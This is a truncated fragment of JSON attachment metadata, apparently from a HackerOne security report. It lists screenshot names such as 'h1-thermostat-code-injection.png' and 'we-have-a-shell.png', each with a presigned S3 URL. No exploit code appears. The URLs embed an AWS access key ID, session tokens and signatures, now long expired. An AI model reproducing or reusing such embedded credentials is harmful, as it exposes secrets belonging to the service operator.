Vtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=854f80dd63128afa2c1bc66bbd82629babf95d93db2588211870948bb357b494","file_size":26719,"type":"image/png"},{"id":438191,"file_name":"h1-thermostat-login.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/438/191/719b21057743c4dc63369b851e9cc23e6093aac6/h1-thermostat-login.png?response-content-disposition=attachment%3B%20filename%3D%22h1-thermostat-login.png%22%3B%20filename%2A%3DUTF-8%27%27h1-thermostat-login.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150744Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=08d9311ca177fb430c3a23402e8992cf651c822ad0a8c579f11926c5a015013a","file_size":508173,"type":"image/png"},{"id":438192,"file_name":"hash-guessing.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/438/192/8f6a4213fc0a5f41364eb96cfb66edcb562adf6a/hash-guessing.png?response-content-disposition=attachment%3B%20filename%3D%22hash-guessing.png%22%3B%20filename%2A%3DUTF-8%27%27hash-guessing.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150744Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=5bf0d790fda33042f7377a9c3dafe240b7ae438c77ecadf844ca633f5266aadf","file_size":372475,"type":"image/png"},{"id":438195,"file_name":"h1-thermostat-in.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/438/195/d79fec67d30cea0fbe3e5dba87f6c71fd4d0859a/h1-thermostat-in.png?response-content-disposition=attachment%3B%20filename%3D%22h1-thermostat-in.png%22%3B%20filename%2A%3DUTF-8%27%27h1-thermostat-in.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150744Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b7155941ab5cc87b1acde5dc6f47d93280e5af749fc062cb817463bb22e0d088","file_size":688644,"type":"image/png"},{"id":438197,"file_name":"h1-thermostat-update-get-params.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/438/197/dc9367388f8ec5fd92bfe91fae1a14c76072c0bd/h1-thermostat-update-get-params.png?response-content-disposition=attachment%3B%20filename%3D%22h1-thermostat-update-get-params.png%22%3B%20filename%2A%3DUTF-8%27%27h1-thermostat-update-get-params.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150744Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=083429e4d4df137f0332cd24dd243ebedbbe759971cc98084d9e53ad22de67a3","file_size":532090,"type":"image/png"},{"id":438198,"file_name":"h1-thermostat-code-injection.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/438/198/9a515cef5a7d934f7bda03add00c58937ce2b080/h1-thermostat-code-injection.png?response-content-disposition=attachment%3B%20filename%3D%22h1-thermostat-code-injection.png%22%3B%20filename%2A%3DUTF-8%27%27h1-thermostat-code-injection.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150744Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=3e1cbf949ee3c63ea9cb2d7901d52ed161046dee4d3490d32b7f568c78888af2","file_size":545667,"type":"image/png"},{"id":438200,"file_name":"we-have-a-shell.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/438/200/9f4e480068f2feea684b1c14c594e879a8bb0204/we-have-a-shell.png?response-content-disposition=attachment%3B%20filename%3D%22we-have-a-shell.png%22%3B%20filename%2A%3DUTF-8%27%27we-have-a-shell.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150744Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c6c12e8a8ba683c43660a447155f00b3f395cfdcf965b2c7bd0a04844f163dac","file_size":324075,"type":"image/png"},{"id":438208,"file_name":"h1-invoices-home.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/438/208/a221b4aa13cfef4790e5d06ad74858ce797b3958/h1-invoices-home.png?response-content-disposition=attachment%3B%20filename%3D%22h1-invoices-home.png%22%3B%20filename%2A%3DUTF-8%27%27h1-invoices-home.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150744Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=0c58e3a058a1ffd7fcd275ce92ec5bd0b799fea8bc484cdfa8ed35d81c1242f7","file_size":357382,"type":"image/png"},{"id":438209,"file_name":"h1-invoices-new.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/438/209/23b2055934421a2f866e405e2c3612c552667571/h1-invoices-new.png?response-content-disposition=attachment%3B%20filename%3D%22h1-invoices-new.png%22%3B%20filename%2A%3DUTF-8%27%27h1-invoices-new.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150744Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b664cd0aea6dd87ec8418447ee0bf53cb27e90006df9cb9007e2982477450002","file_size":413924,"type":"image/png"},{"id":438211,"file_name":"img-tag-in.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/438/211/7e1a7d51be6125febb26d298a7175910d8a9d8b5/img-tag-in.png?response-content-disposition=attachment%3B%20filename%3D%22img-tag-in.png%22%3B%20filename%2A%3DUTF-8%27%27img-tag-in.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150744Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=8ae4a9a5889d96e05067fab4b2ecd88859178fb0b55b7e5ea20453e688b210bf","file_size":461899,"type":"image/png"},{"id":438212,"file_name":"